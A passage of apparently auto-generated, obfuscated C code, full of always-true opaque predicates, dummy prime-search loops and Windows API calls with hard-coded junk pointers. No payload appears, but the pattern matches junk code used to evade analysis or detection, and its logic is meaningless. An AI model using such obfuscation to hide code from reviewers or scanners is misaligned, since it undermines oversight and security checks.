      unsigned int v1585c7f48a0977226769ec7e9ae7172a_computation_opaque = (unsigned int) 0;
      unsigned int veb93bdc2f3b72821c2495b79f460c033_computation_opaque = (unsigned int) 3;
      unsigned int v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque = (unsigned int) (&v52e59e502d09d350970030a7fc695c8c_useless_opaque);
      v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque = (v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque < ((unsigned int) 3))
      {
        v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque = (unsigned int) 3;
      }
      while (v1585c7f48a0977226769ec7e9ae7172a_computation_opaque != ((unsigned int) 1))
      {
        v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque += (unsigned int) 2;
        v1585c7f48a0977226769ec7e9ae7172a_computation_opaque = (unsigned int) 1;
        veb93bdc2f3b72821c2495b79f460c033_computation_opaque = (unsigned int) 3;
        while ((veb93bdc2f3b72821c2495b79f460c033_computation_opaque * veb93bdc2f3b72821c2495b79f460c033_computation_opaque) <= v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque)
        {
          if ((v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque % veb93bdc2f3b72821c2495b79f460c033_computation_opaque) == ((unsigned int) 0))
          {
            v1585c7f48a0977226769ec7e9ae7172a_computation_opaque = (unsigned int) 0;
          }
          veb93bdc2f3b72821c2495b79f460c033_computation_opaque = veb93bdc2f3b72821c2495b79f460c033_computation_opaque + ((unsigned int) 2);
        }

      }

      unsigned int v2b96c656782b90a040f17c419447e3c6_prime_opaque = v0a6726ad4ad6554c71cc225d086c81c9_computation_opaque;
    }

    unsigned int vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque;
    unsigned int v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = (unsigned int) 2111918448;
    unsigned int v194d3c9523a787887511b556e8d39695_random_opaque = (unsigned int) (&v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque);
    {
      if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
      {
        v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque <= v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
        vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque < vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
        v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = v5f9bc37a953debb4d7a4c1470b061888_useless_opaque * v194d3c9523a787887511b556e8d39695_random_opaque;
        vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque * v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque;
        if ((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25)))
        {
          if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
          {
            vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque * v194d3c9523a787887511b556e8d39695_random_opaque;
            v194d3c9523a787887511b556e8d39695_random_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque < v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
            v095e5d529b8b1733f974e1456778da54_computation_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque | v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque;
            v095e5d529b8b1733f974e1456778da54_computation_opaque = v5f9bc37a953debb4d7a4c1470b061888_useless_opaque || v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
            if ((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25)))
            {
              if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
              {
                v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque % ((unsigned int) 63);
                vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque % vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque <= v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
                v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque | v5f9bc37a953debb4d7a4c1470b061888_useless_opaque;
                v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque == v194d3c9523a787887511b556e8d39695_random_opaque;
                if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                {
                  if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                  {
                    v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = v194d3c9523a787887511b556e8d39695_random_opaque < v095e5d529b8b1733f974e1456778da54_computation_opaque;
                    v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque != ((unsigned int) 6);
                  }
                  v095e5d529b8b1733f974e1456778da54_computation_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque <= v194d3c9523a787887511b556e8d39695_random_opaque;
                  v194d3c9523a787887511b556e8d39695_random_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque + v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque;
                }
              }
              if ((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25)))
              {
                v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = v194d3c9523a787887511b556e8d39695_random_opaque - vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
              }
            }
          }
        }
      }
      if ((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25)))
      {
        unsigned int v52fe191ceb0cc6716213832fdee51552_useless_opaque = (unsigned int) 292548338;
        unsigned int v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = (unsigned int) 0;
        unsigned int vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque = (unsigned int) 3;
        if (((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2)))
        {
          if ((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25)))
          {
            if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
            {
              if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
              {
                void * v91d1901fc25dccf0d23ee8a2ffb35a7c = (void *) 0x2ede8490;
                void * v340f6fb733715f1e044fe59a77fc6f84 = (void *) 0xfa7d0a2d;
                if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                {
                  unsigned long vd8e0871d3c932f149774386f18c72b00 = (unsigned long) 0x297b6dc5;
                  if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                  {
                    void * v0b8d48f8416937fbbe86a46839de4ed6 = (void *) 0x609f80d0;
                    long v60418fd304fdd6bda57f9bab3f2a404a = (long) 0xd4d8055a;
                    if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                    {
                      v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque != v095e5d529b8b1733f974e1456778da54_computation_opaque;
                      v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque != v6c7a5b47ce7e33acc5965514e305a914_computation_opaque;
                      v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque | v6c7a5b47ce7e33acc5965514e305a914_computation_opaque;
                      v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v5f9bc37a953debb4d7a4c1470b061888_useless_opaque != vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                      vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque != ((unsigned int) 52);
                      v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque + v194d3c9523a787887511b556e8d39695_random_opaque;
                      v52fe191ceb0cc6716213832fdee51552_useless_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque / v194d3c9523a787887511b556e8d39695_random_opaque;
                    }
                    v60418fd304fdd6bda57f9bab3f2a404a = RoUnregisterForApartmentShutdown(v0b8d48f8416937fbbe86a46839de4ed6);
                  }
                  void * v40844929dbe139dbb7c87d307893c2e5 = (void *) 0xede83598;
                  int va3d30111c2d5da1727e6dd75fe07a317 = (int) 0x80064ade;
                  void * vbe2a300f152b6162599b1c8566ff77fa = (void *) 0xf9b0b79c;
                  int v4d4c242a2e05b43bee6d0e7280a635e9 = (int) 0x8714f105;
                  if (((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2)))
                  {
                    int v7a049eb9a77a81c9d504affd95f791bb = (int) 0xb42972a6;
                    v7a049eb9a77a81c9d504affd95f791bb = IdnToNameprepUnicode(vd8e0871d3c932f149774386f18c72b00, v40844929dbe139dbb7c87d307893c2e5, va3d30111c2d5da1727e6dd75fe07a317, vbe2a300f152b6162599b1c8566ff77fa, v4d4c242a2e05b43bee6d0e7280a635e9);
                  }
                }
                unsigned long vbb31c4d4b4ca014ea15d1315fb724042 = (unsigned long) 0xea22df27;
                unsigned long v2993d4f70f2b28805cd3bbd0a1f84d59 = (unsigned long) 0x851340d5;
                v2993d4f70f2b28805cd3bbd0a1f84d59 = GetModuleFileNameA(v91d1901fc25dccf0d23ee8a2ffb35a7c, v340f6fb733715f1e044fe59a77fc6f84, vbb31c4d4b4ca014ea15d1315fb724042);
              }
              void * v7c53557e215df6f020533122190b992a = (void *) 0x140adb44;
              long v62ef488e6e281d763137467fbc237a15 = (long) 0x64882840;
              v62ef488e6e281d763137467fbc237a15 = RoUnregisterForApartmentShutdown(v7c53557e215df6f020533122190b992a);
            }
            if (((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2)))
            {
              unsigned int v00afcd95c1652894507a953453aec944_computation_opaque = (unsigned int) (&v52fe191ceb0cc6716213832fdee51552_useless_opaque);
              if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
              {
                unsigned long v473a4fc2fb1d1d480a9ff6a863081df1 = (unsigned long) 0x34f57ead;
                unsigned long v5f43f9a7e7f9cee3460f1ea22d91b359 = (unsigned long) 0x8a3cfbd4;
                if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                {
                  v00afcd95c1652894507a953453aec944_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque < v194d3c9523a787887511b556e8d39695_random_opaque;
                  v52fe191ceb0cc6716213832fdee51552_useless_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque != v194d3c9523a787887511b556e8d39695_random_opaque;
                  v52fe191ceb0cc6716213832fdee51552_useless_opaque = vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque != v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque;
                }
                v5f43f9a7e7f9cee3460f1ea22d91b359 = MsiGetActiveDatabase(v473a4fc2fb1d1d480a9ff6a863081df1);
              }
              if (((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2)))
              {
                v00afcd95c1652894507a953453aec944_computation_opaque = (v00afcd95c1652894507a953453aec944_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
                if (v00afcd95c1652894507a953453aec944_computation_opaque < ((unsigned int) 3))
                {
                  if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                  {
                    v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v52fe191ceb0cc6716213832fdee51552_useless_opaque / vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                    v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque / vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                    v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = v194d3c9523a787887511b556e8d39695_random_opaque <= ((unsigned int) 36);
                    if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                    {
                      v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque | v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque;
                    }
                    v194d3c9523a787887511b556e8d39695_random_opaque = v52fe191ceb0cc6716213832fdee51552_useless_opaque == v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
                    v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v52fe191ceb0cc6716213832fdee51552_useless_opaque <= v5f9bc37a953debb4d7a4c1470b061888_useless_opaque;
                    vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque = v194d3c9523a787887511b556e8d39695_random_opaque / v5f9bc37a953debb4d7a4c1470b061888_useless_opaque;
                  }
                  if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                  {
                    v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque < vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                  }
                  if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                  {
                    void * vd96e8491bb03d3e73e916a3e4e6641b3 = (void *) 0x92b9d83b;
                    unsigned long vbf5a9fc20df0a040b2c1c0ca15456bc1 = (unsigned long) 0x935da458;
                    unsigned long v01e17945d09c9814dd2a0c95914687d8 = (unsigned long) 0x7a277725;
                    v01e17945d09c9814dd2a0c95914687d8 = SnmpListen(vd96e8491bb03d3e73e916a3e4e6641b3, vbf5a9fc20df0a040b2c1c0ca15456bc1);
                    if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                    {
                      void * v111fb035050db904a1d057eff65a41b6 = (void *) 0x01dbda6a;
                      unsigned long v1f6ea99a2cd36bc5842a914e5916b1b1 = (unsigned long) 0x1848a865;
                      unsigned long v1e6c511b3e8058a6600a4061b3e45817 = (unsigned long) 0xef5768cc;
                      if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                      {
                        v52fe191ceb0cc6716213832fdee51552_useless_opaque = v194d3c9523a787887511b556e8d39695_random_opaque + v52fe191ceb0cc6716213832fdee51552_useless_opaque;
                        if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                        {
                          v00afcd95c1652894507a953453aec944_computation_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque / v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
                          vbb1105d9726aa89618c8ca3801ef988f_prime_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque * vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque;
                        }
                        v5f9bc37a953debb4d7a4c1470b061888_useless_opaque = vbb1105d9726aa89618c8ca3801ef988f_prime_opaque <= vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque;
                        v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque - v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
                        v194d3c9523a787887511b556e8d39695_random_opaque = v52fe191ceb0cc6716213832fdee51552_useless_opaque != v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
                        v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque != v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque;
                        v194d3c9523a787887511b556e8d39695_random_opaque = v00afcd95c1652894507a953453aec944_computation_opaque / v6c7a5b47ce7e33acc5965514e305a914_computation_opaque;
                      }
                      v1e6c511b3e8058a6600a4061b3e45817 = SnmpListen(v111fb035050db904a1d057eff65a41b6, v1f6ea99a2cd36bc5842a914e5916b1b1);
                    }
                  }
                  v00afcd95c1652894507a953453aec944_computation_opaque = (unsigned int) 3;
                }
                while (v6c7a5b47ce7e33acc5965514e305a914_computation_opaque != ((unsigned int) 1))
                {
                  v00afcd95c1652894507a953453aec944_computation_opaque += (unsigned int) 2;
                  v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = (unsigned int) 1;
                  vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque = (unsigned int) 3;
                  while ((vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque * vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque) <= v00afcd95c1652894507a953453aec944_computation_opaque)
                  {
                    if ((v00afcd95c1652894507a953453aec944_computation_opaque % vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque) == ((unsigned int) 0))
                    {
                      if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                      {
                        void * v70afe8948bdd53466b9e4d24e4275557 = (void *) 0xa7d702fe;
                        unsigned long vf1803d41fdb89c7c63fbf2a51d3a9124 = (unsigned long) 0x593f819d;
                        if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                        {
                          void * v3626cb59d8ae79a735498937e03cef11 = (void *) 0xb90f3a17;
                          unsigned long vdeedbd7cee74f0eaada1b1853904f17e = (unsigned long) 0xdcab5b35;
                          unsigned long v3ea91991599a9d17433e83f1f92c0801 = (unsigned long) 0xa699a940;
                          v3ea91991599a9d17433e83f1f92c0801 = SnmpListen(v3626cb59d8ae79a735498937e03cef11, vdeedbd7cee74f0eaada1b1853904f17e);
                        }
                        unsigned long v584c1f2eeef5fa6770d472aaa55b0a74 = (unsigned long) 0xbc305d40;
                        v584c1f2eeef5fa6770d472aaa55b0a74 = SnmpListen(v70afe8948bdd53466b9e4d24e4275557, vf1803d41fdb89c7c63fbf2a51d3a9124);
                      }
                      v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = (unsigned int) 0;
                    }
                    vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque = vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque + ((unsigned int) 2);
                  }

                }

                unsigned int vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque = v00afcd95c1652894507a953453aec944_computation_opaque;
                if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                {
                  v095e5d529b8b1733f974e1456778da54_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque == vbb1105d9726aa89618c8ca3801ef988f_prime_opaque;
                  if (!(((vbb1105d9726aa89618c8ca3801ef988f_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vbb1105d9726aa89618c8ca3801ef988f_prime_opaque == ((unsigned int) 2))))
                  {
                    v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque || v194d3c9523a787887511b556e8d39695_random_opaque;
                    if (!(((vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque == ((unsigned int) 2))))
                    {
                      v095e5d529b8b1733f974e1456778da54_computation_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque * v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque;
                      v52fe191ceb0cc6716213832fdee51552_useless_opaque = vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque < vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque;
                      v6c7a5b47ce7e33acc5965514e305a914_computation_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque * v6c7a5b47ce7e33acc5965514e305a914_computation_opaque;
                      v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque = v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque < vecb8413303e8fe5863e0fe1b3a748b1b_computation_opaque;
                      v5843b2a5c7c7c1e61bc08c6c0aa79ca7_useless_opaque = v6c7a5b47ce7e33acc5965514e305a914_computation_opaque <= v5f9bc37a953debb4d7a4c1470b061888_useless_opaque;
                      v095e5d529b8b1733f974e1456778da54_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque == v095e5d529b8b1733f974e1456778da54_computation_opaque;
                    }
                  }
                  if (!((((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 9)) + ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 16))) == ((v194d3c9523a787887511b556e8d39695_random_opaque * v194d3c9523a787887511b556e8d39695_random_opaque) * ((unsigned int) 25))))
                  {
                    vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque = v095e5d529b8b1733f974e1456778da54_computation_opaque * v6fbe55e6bbee1ae9c25f8dfe26aac5cd_computation_opaque;
                  }
                  vcc9cd452dc9e327ba364fbc7d54ac697_prime_opaque = v6c7a5b47ce7e33acc5965514e305a914_computation_opaque != v5f9bc37a953debb4d7a4c1470b061888_useless_opaque;
                  v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque = v2a0c1e92fdc41f164c0f935d49a80408_computation_opaque / v5f9bc37a953debb4d7a4c1470b061888_useless_opaque;
                }
                {
